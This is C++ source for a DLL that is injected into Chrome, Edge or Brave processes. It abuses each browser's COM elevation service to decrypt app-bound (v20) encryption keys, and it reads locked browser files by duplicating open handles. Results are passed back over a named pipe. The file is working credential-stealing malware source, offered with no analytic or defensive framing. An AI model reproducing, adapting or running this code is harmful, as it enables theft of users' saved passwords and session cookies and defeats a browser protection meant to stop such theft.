// key_extractor.cpp - COM elevator for v20 key decryption + file reading
// Injected into browser process via LoadLibraryW, communicates via named pipe
// Supports Chrome, Edge, and Brave
//
// Pipe name is set via environment variable RECOVERY_PIPE before injection.
// Compiled with: g++ -shared -O2 -s -o dll.dll key_extractor.cpp -lcrypt32 -lole32 -loleaut32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <objbase.h>
#include <oleauto.h>

// ============================================================
// CRT replacements - no external string/memory functions
// ============================================================
static int my_memcmp(const void* a, const void* b, SIZE_T n) {
    const BYTE* pa = (const BYTE*)a;
    const BYTE* pb = (const BYTE*)b;
    for (SIZE_T i = 0; i < n; i++) {
        if (pa[i] != pb[i]) return pa[i] - pb[i];
    }
    return 0;
}

static void* my_memcpy(void* dst, const void* src, SIZE_T n) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    for (SIZE_T i = 0; i < n; i++) d[i] = s[i];
    return dst;
}

static char* my_strchr(const char* s, int c) {
    while (*s) { if (*s == (char)c) return (char*)s; s++; }
    return NULL;
}

static const wchar_t* my_wcsstr(const wchar_t* h, const wchar_t* n) {
    if (!*n) return h;
    for (const wchar_t* p = h; *p; p++) {
        const wchar_t* hh = p; const wchar_t* nn = n;
        while (*hh && *nn && *hh == *nn) { hh++; nn++; }
        if (!*nn) return p;
    }
    return NULL;
}

static int my_wcsicmp(const wchar_t* a, const wchar_t* b) {
    for (; *a && *b; a++, b++) {
        wchar_t ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return ca - cb;
    }
    wchar_t ca = *a, cb = *b;
    if (ca >= 'A' && ca <= 'Z') ca += 32;
    if (cb >= 'A' && cb <= 'Z') cb += 32;
    return ca - cb;
}

static SIZE_T my_wcslen(const wchar_t* s) {
    SIZE_T n = 0; while (*s++) n++; return n;
}

// ============================================================
// Chrome/Brave IElevator interface
// ============================================================
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

// ============================================================
// Edge interface chain
// ============================================================
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeMethod1() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeMethod2() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeMethod3() = 0;
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeElevatorIntermediate : public IEdgeElevatorBase {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevator : public IEdgeElevatorIntermediate {};

MIDL_INTERFACE("8F7B6792-784D-4047-845D-1782EFBEF205")
IEdgeElevator2 : public IEdgeElevatorIntermediate {};

// ============================================================
// CLSIDs and IIDs per browser
// ============================================================
static const CLSID CLSID_CHROME  = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
static const IID   IID_CHROME    = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
static const IID   IID_CHROME2   = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

static const CLSID CLSID_EDGE    = {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}};
static const IID   IID_EDGE      = {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
static const IID   IID_EDGE2     = {0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}};

static const CLSID CLSID_BRAVE   = {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}};
static const IID   IID_BRAVE     = {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}};
static const IID   IID_BRAVE2    = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

// ============================================================
// Pipe I/O helpers - length-prefixed binary protocol
// ============================================================
static BOOL pipe_read_exact(HANDLE hPipe, void* buf, DWORD len) {
    BYTE* p = (BYTE*)buf;
    DWORD remaining = len;
    while (remaining > 0) {
        DWORD rd = 0;
        if (!ReadFile(hPipe, p, remaining, &rd, NULL) || rd == 0) return FALSE;
        p += rd;
        remaining -= rd;
    }
    return TRUE;
}

static BOOL pipe_write_all(HANDLE hPipe, const void* buf, DWORD len) {
    const BYTE* p = (const BYTE*)buf;
    DWORD remaining = len;
    while (remaining > 0) {
        DWORD wr = 0;
        if (!WriteFile(hPipe, p, remaining, &wr, NULL) || wr == 0) return FALSE;
        p += wr;
        remaining -= wr;
    }
    return TRUE;
}

static BOOL send_response(HANDLE hPipe, BYTE status, const void* data, DWORD data_len) {
    DWORD total = 1 + data_len;
    if (!pipe_write_all(hPipe, &total, 4)) return FALSE;
    if (!pipe_write_all(hPipe, &status, 1)) return FALSE;
    if (data_len > 0 && !pipe_write_all(hPipe, data, data_len)) return FALSE;
    FlushFileBuffers(hPipe);
    return TRUE;
}

// ============================================================
// Decrypt via COM elevator
// ============================================================
static BOOL DecryptViaElevator(const BYTE* encKey, DWORD encLen, const wchar_t* browser,
                                BYTE* outKey, DWORD* outLen) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return FALSE;

    BSTR bstrEnc = SysAllocStringByteLen((const char*)encKey, encLen);
    if (!bstrEnc) { CoUninitialize(); return FALSE; }

    BSTR bstrPlain = NULL;
    DWORD comErr = 0;
    BOOL result = FALSE;

    if (my_wcsicmp(browser, L"edge") == 0) {
        IEdgeElevator2* elevator2 = NULL;
        hr = CoCreateInstance(CLSID_EDGE, NULL, CLSCTX_LOCAL_SERVER, IID_EDGE2, (void**)&elevator2);
        if (SUCCEEDED(hr)) {
            CoSetProxyBlanket(elevator2, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
            hr = elevator2->DecryptData(bstrEnc, &bstrPlain, &comErr);
            elevator2->Release();
        }
        if (FAILED(hr) || !bstrPlain) {
            IEdgeElevator* elevator = NULL;
            hr = CoCreateInstance(CLSID_EDGE, NULL, CLSCTX_LOCAL_SERVER, IID_EDGE, (void**)&elevator);
            if (SUCCEEDED(hr)) {
                CoSetProxyBlanket(elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                    COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                    RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
                hr = elevator->DecryptData(bstrEnc, &bstrPlain, &comErr);
                elevator->Release();
            }
        }
    } else {
        const CLSID* clsid = &CLSID_CHROME;
        const IID* iid = &IID_CHROME;
        const IID* iid2 = &IID_CHROME2;

        if (my_wcsicmp(browser, L"brave") == 0) {
            clsid = &CLSID_BRAVE;
            iid = &IID_BRAVE;
            iid2 = &IID_BRAVE2;
        }

        IElevator* elevator = NULL;
        hr = CoCreateInstance(*clsid, NULL, CLSCTX_LOCAL_SERVER, *iid2, (void**)&elevator);
        if (FAILED(hr)) {
            hr = CoCreateInstance(*clsid, NULL, CLSCTX_LOCAL_SERVER, *iid, (void**)&elevator);
        }
        if (SUCCEEDED(hr)) {
            CoSetProxyBlanket(elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
            hr = elevator->DecryptData(bstrEnc, &bstrPlain, &comErr);
            elevator->Release();
        }
    }

    SysFreeString(bstrEnc);

    if (SUCCEEDED(hr) && bstrPlain) {
        UINT len = SysStringByteLen(bstrPlain);
        if (len > 0 && len <= 64) {
            my_memcpy(outKey, bstrPlain, len);
            *outLen = len;
            result = TRUE;
        }
        SysFreeString(bstrPlain);
    }

    CoUninitialize();
    return result;
}

// ============================================================
// Handle KEY command
// ============================================================
static void handle_key(HANDLE hPipe, char* args) {
    char* sep = my_strchr(args, ':');
    if (!sep) { send_response(hPipe, 1, "bad format", 10); return; }
    *sep = 0;

    wchar_t browserW[32] = {0};
    MultiByteToWideChar(CP_UTF8, 0, args, -1, browserW, 32);

    DWORD encLen = 0;
    CryptStringToBinaryA(sep + 1, 0, CRYPT_STRING_BASE64, NULL, &encLen, NULL, NULL);
    if (encLen < 5) { send_response(hPipe, 1, "small key", 9); return; }

    BYTE* encKey = (BYTE*)HeapAlloc(GetProcessHeap(), 0, encLen);
    if (!encKey) { send_response(hPipe, 1, "alloc fail", 10); return; }
    CryptStringToBinaryA(sep + 1, 0, CRYPT_STRING_BASE64, encKey, &encLen, NULL, NULL);

    BYTE decKey[64];
    DWORD decLen = 0;
    BOOL ok = DecryptViaElevator(encKey, encLen, browserW, decKey, &decLen);
    HeapFree(GetProcessHeap(), 0, encKey);

    if (ok && decLen > 0)
        send_response(hPipe, 0, decKey, decLen);
    else
        send_response(hPipe, 1, "decrypt failed", 14);
}

// ============================================================
// Handle READ command
// ============================================================
static HANDLE find_open_handle(const wchar_t* target_path) {
    const wchar_t* suffix = target_path;
    int sep_count = 0;
    for (int i = (int)my_wcslen(target_path) - 1; i >= 0 && sep_count < 2; i--) {
        if (target_path[i] == L'\\') {
            sep_count++;
            if (sep_count == 2) suffix = target_path + i;
        }
    }

    for (ULONG_PTR h = 4; h < 0x10000; h += 4) {
        if (GetFileType((HANDLE)h) != FILE_TYPE_DISK) continue;
        wchar_t name[MAX_PATH + 8];
        DWORD len = GetFinalPathNameByHandleW((HANDLE)h, name, MAX_PATH + 8, VOLUME_NAME_DOS);
        if (len == 0 || len >= MAX_PATH + 8) continue;
        if (!my_wcsstr(name, suffix)) continue;
        HANDLE hDup = INVALID_HANDLE_VALUE;
        if (DuplicateHandle(GetCurrentProcess(), (HANDLE)h, GetCurrentProcess(), &hDup,
                            0, FALSE, DUPLICATE_SAME_ACCESS))
            return hDup;
    }
    return INVALID_HANDLE_VALUE;
}

static void handle_read(HANDLE hPipe, const char* utf8path) {
    wchar_t path[MAX_PATH] = {0};
    MultiByteToWideChar(CP_UTF8, 0, utf8path, -1, path, MAX_PATH);

    HANDLE hFile = CreateFileW(path, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    BOOL via_dup = FALSE;
    if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_SHARING_VIOLATION) {
        hFile = find_open_handle(path);
        via_dup = TRUE;
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        send_response(hPipe, 1, "open failed", 11);
        return;
    }

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size > 50 * 1024 * 1024) {
        CloseHandle(hFile);
        send_response(hPipe, 1, "bad size", 8);
        return;
    }

    BYTE* data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!data) { CloseHandle(hFile); send_response(hPipe, 1, "alloc fail", 10); return; }

    if (via_dup) {
        OVERLAPPED ov = {0};
        DWORD rd = 0;
        BOOL ok = ReadFile(hFile, data, size, &rd, &ov) && rd == size;
        CloseHandle(hFile);
        if (ok) send_response(hPipe, 0, data, size);
        else send_response(hPipe, 1, "dup read fail", 13);
    } else {
        DWORD rd = 0;
        BOOL ok = ReadFile(hFile, data, size, &rd, NULL) && rd == size;
        CloseHandle(hFile);
        if (ok) send_response(hPipe, 0, data, size);
        else send_response(hPipe, 1, "read fail", 9);
    }

    HeapFree(GetProcessHeap(), 0, data);
}

// ============================================================
// Worker thread
// ============================================================
static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    const wchar_t* pipeName = (const wchar_t*)lpParam;
    HANDLE hPipe = CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return 1;

    while (TRUE) {
        DWORD msgLen = 0;
        if (!pipe_read_exact(hPipe, &msgLen, 4) || msgLen == 0 || msgLen > 16384) break;

        char* msg = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, msgLen + 1);
        if (!msg) break;
        if (!pipe_read_exact(hPipe, msg, msgLen)) { HeapFree(GetProcessHeap(), 0, msg); break; }

        if (msgLen >= 4 && my_memcmp(msg, "KEY:", 4) == 0)
            handle_key(hPipe, msg + 4);
        else if (msgLen >= 5 && my_memcmp(msg, "READ:", 5) == 0)
            handle_read(hPipe, msg + 5);
        else if (msgLen >= 4 && my_memcmp(msg, "EXIT", 4) == 0) {
            HeapFree(GetProcessHeap(), 0, msg);
            break;
        } else
            send_response(hPipe, 1, "unknown", 7);

        HeapFree(GetProcessHeap(), 0, msg);
    }

    CloseHandle(hPipe);
    return 0;
}

// ============================================================
// DllMain - entry point
// Reads pipe name from RECOVERY_PIPE environment variable
// ============================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Read pipe name from environment variable
        wchar_t pipeName[128];
        DWORD len = GetEnvironmentVariableW(L"RECOVERY_PIPE", pipeName, 128);
        if (len > 0 && len < 128) {
            // Allocate pipe name on heap so it survives DllMain return
            wchar_t* pipeNameHeap = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (len + 1) * sizeof(wchar_t));
            if (pipeNameHeap) {
                my_memcpy(pipeNameHeap, pipeName, (len + 1) * sizeof(wchar_t));
                HANDLE hThread = CreateThread(NULL, 0, WorkerThread, pipeNameHeap, 0, NULL);
                if (hThread) CloseHandle(hThread);
            }
        }
    }
    return TRUE;
}
